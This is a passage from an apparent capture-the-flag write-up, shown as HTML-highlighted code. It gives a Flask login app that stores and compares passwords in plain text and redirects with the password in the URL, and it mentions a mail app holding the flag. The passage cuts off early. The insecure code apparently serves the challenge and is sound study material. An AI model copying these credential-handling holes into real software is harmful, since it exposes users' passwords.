</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">51
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>flask</span> <span style=color:#c678dd>import</span> <span style=color:#c1abea>Flask</span>, <span style=color:#c1abea>request</span>, <span style=color:#c1abea>make_response</span>, <span style=color:#c1abea>redirect</span>, <span style=color:#c1abea>url_for</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>jinja2</span> <span style=color:#c678dd>import</span> <span style=color:#c1abea>Environment</span>, <span style=color:#c1abea>select_autoescape</span>, <span style=color:#c1abea>FileSystemLoader</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>flask_sqlalchemy</span> <span style=color:#c678dd>import</span> <span style=color:#c1abea>SQLAlchemy</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>Flask</span>(<span style=color:#c1abea>__name__</span>)
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>config</span>[<span style=color:#63c381>&#34;SQLALCHEMY_DATABASE_URI&#34;</span>] <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;sqlite:////database.db&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>config</span>[<span style=color:#63c381>&#34;SQLALCHEMY_TRACK_MODIFICATIONS&#34;</span>] <span style=color:#c7bf54>=</span> <span style=color:#b756ff;font-weight:700>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>db</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>SQLAlchemy</span>(<span style=color:#c1abea>app</span>)
</span></span><span style=display:flex><span><span style=color:#c1abea>loader</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>FileSystemLoader</span>(<span style=color:#c1abea>searchpath</span><span style=color:#c7bf54>=</span><span style=color:#63c381>&#34;templates/&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c1abea>env</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>Environment</span>(<span style=color:#c1abea>loader</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>loader</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>class</span> <span style=color:#76a9f9>User</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Model</span>):
</span></span><span style=display:flex><span>    <span style=color:#ef8383>id</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Integer</span>, <span style=color:#c1abea>primary_key</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>True</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>username</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>String</span>(<span style=color:#d19a66>50</span>), <span style=color:#c1abea>unique</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>True</span>, <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>password</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>String</span>(<span style=color:#d19a66>50</span>), <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>email</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>String</span>(<span style=color:#d19a66>100</span>), <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>emails</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>relationship</span>(<span style=color:#63c381>&#34;Email&#34;</span>, <span style=color:#c1abea>backref</span><span style=color:#c7bf54>=</span><span style=color:#63c381>&#34;user&#34;</span>, <span style=color:#c1abea>lazy</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>True</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>def</span> <span style=color:#c1abea>__repr__</span>(<span style=color:#c1abea>self</span>):
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#98c379>f</span><span style=color:#63c381>&#34;User(&#39;</span><span style=color:#98c379>{</span><span style=color:#c1abea>self</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>username</span><span style=color:#98c379>}</span><span style=color:#63c381>&#39;, &#39;</span><span style=color:#98c379>{</span><span style=color:#c1abea>self</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>email</span><span style=color:#98c379>}</span><span style=color:#63c381>&#39;)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>class</span> <span style=color:#76a9f9>Email</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Model</span>):
</span></span><span style=display:flex><span>    <span style=color:#ef8383>id</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Integer</span>, <span style=color:#c1abea>primary_key</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>True</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>subject</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>String</span>(<span style=color:#d19a66>100</span>), <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>body</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Text</span>, <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>user_id</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Integer</span>, <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>ForeignKey</span>(<span style=color:#63c381>&#34;user.id&#34;</span>), <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>def</span> <span style=color:#c1abea>__repr__</span>(<span style=color:#c1abea>self</span>):
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#98c379>f</span><span style=color:#63c381>&#34;Email(&#39;</span><span style=color:#98c379>{</span><span style=color:#c1abea>self</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>subject</span><span style=color:#98c379>}</span><span style=color:#63c381>&#39;, &#39;</span><span style=color:#98c379>{</span><span style=color:#c1abea>self</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>body</span><span style=color:#98c379>}</span><span style=color:#63c381>&#39;)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>@app.route</span>(<span style=color:#98c379>&#39;/&#39;</span>, <span style=color:#c1abea>methods</span><span style=color:#c7bf54>=</span>[<span style=color:#63c381>&#34;GET&#34;</span>, <span style=color:#63c381>&#34;POST&#34;</span>])
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>login</span>():
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>method</span> <span style=color:#c7bf54>==</span> <span style=color:#63c381>&#34;GET&#34;</span>:
</span></span><span style=display:flex><span>        <span style=color:#c1abea>error</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>args</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get</span>(<span style=color:#63c381>&#34;error&#34;</span>, <span style=color:#63c381>&#34;&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#c1abea>make_response</span>(<span style=color:#c1abea>env</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get_template</span>(<span style=color:#63c381>&#34;login.html&#34;</span>)<span style=color:#c7bf54>.</span><span style=color:#c1abea>render</span>(<span style=color:#c1abea>error</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>error</span>))
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>method</span> <span style=color:#c7bf54>==</span> <span style=color:#63c381>&#34;POST&#34;</span>:
</span></span><span style=display:flex><span>        <span style=color:#c1abea>username</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>form</span>[<span style=color:#63c381>&#34;username&#34;</span>]
</span></span><span style=display:flex><span>        <span style=color:#c1abea>password</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>form</span>[<span style=color:#63c381>&#34;password&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>user</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>User</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>query</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>filter_by</span>(<span style=color:#c1abea>username</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>username</span>)<span style=color:#c7bf54>.</span><span style=color:#c1abea>first</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#c1abea>user</span> <span style=color:#b756ff;font-weight:700>and</span> <span style=color:#c1abea>user</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>password</span> <span style=color:#c7bf54>==</span> <span style=color:#c1abea>password</span>:
</span></span><span style=display:flex><span>            <span style=color:#c678dd>return</span> <span style=color:#c1abea>redirect</span>(<span style=color:#98c379>f</span><span style=color:#63c381>&#34;http://mail.supersus.corp/auth?auth=</span><span style=color:#98c379>{</span><span style=color:#c1abea>password</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#c1abea>error</span> <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;Invalid username or password.&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#c678dd>return</span> <span style=color:#c1abea>redirect</span>(<span style=color:#c1abea>url_for</span>(<span style=color:#63c381>&#34;login&#34;</span>, <span style=color:#c1abea>error</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>error</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#c1abea>__name__</span> <span style=color:#c7bf54>==</span> <span style=color:#63c381>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>with</span> <span style=color:#c1abea>app</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>app_context</span>():
</span></span><span style=display:flex><span>        <span style=color:#c1abea>app</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>run</span>(<span style=color:#63c381>&#34;0.0.0.0&#34;</span>, <span style=color:#c1abea>port</span><span style=color:#c7bf54>=</span><span style=color:#d19a66>8081</span>)
</span></span></code></pre></td></tr></table></div></div><p>As for <code>mail</code>, we have a Flask mail inbox that also contains the flag inside the <code>admin</code> mailbox. If we&rsquo;re logged in as some user, we can view that user&rsquo;s mails.</p><p>filename=app.py</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">87
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>flask</span> <span style=color:#c678dd>import</span> <span style=color:#c1abea>Flask</span>, <span style=color:#c1abea>render_template</span>, <span style=color:#c1abea>request</span>, <span style=color:#c1abea>make_response</span>, <span style=color:#c1abea>redirect</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>flask_sqlalchemy</span> <span style=color:#c678dd>import</span> <span style=color:#c1abea>SQLAlchemy</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#76a9f9>os</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#76a9f9>random</span>
